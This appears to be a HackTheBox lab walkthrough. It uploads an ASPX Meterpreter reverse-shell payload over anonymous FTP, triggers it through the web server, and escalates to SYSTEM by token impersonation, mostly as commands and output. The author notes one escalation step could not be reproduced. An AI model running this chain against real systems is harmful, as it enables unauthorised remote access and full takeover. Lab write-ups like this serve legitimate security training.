1. we have anonymous access to ftp:
```
λ ftp anonymous@10.10.10.5
```
2. it's clear that we can access the files we upload with the web server, how neat is
   that? let's make a payload.

```
msfpc ASPX 4454
# for ip choose the tunnel device with the vpn ip in the
# htb network: 5.) utun2 - 10.10.x.y
```
This creates an `exe` file as well as a profile for metasploit.

3. listen to the shell calling in:
```
msfconsole -q -r 'windows-meterpreter-staged-reverse-tcp-4454-aspx.rc'
```

4. Uploading the file by ftp:

```
λ ftp anonymous@10.10.10.5
> put windows-meterpreter-staged-reverse-tcp-4454.aspx
> exit
λ curl 10.10.10.5/windows-meterpreter-staged-reverse-tcp-4454.aspx
```

5. in the `msfconsole` we now have a meterpreter shell, we can switch to it by using
```
sessions -i <number>
```

6. we have a low privilege account, no user:
```
meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter > cd /
meterpreter > mkdir tmp
meterpreter > getprivs
============================================================
Enabled Process Privileges
============================================================
  SeAssignPrimaryTokenPrivilege
  SeAuditPrivilege
  SeChangeNotifyPrivilege
  SeCreateGlobalPrivilege
  SeImpersonatePrivilege
  SeIncreaseQuotaPrivilege
  SeIncreaseWorkingSetPrivilege
  SeShutdownPrivilege
  SeTimeZonePrivilege
  SeUndockPrivilege
meterpreter > upload potato.exe
meterpreter > use incognito
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
IIS APPPOOL\Web

Impersonation Tokens Available
========================================
NT AUTHORITY\IUSR
```

Okay, so nothing of interest. Let's get things going:
```
meterpreter >  list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
IIS APPPOOL\Web
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
NT AUTHORITY\IUSR
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

(can't reproduce that …)
… and done.
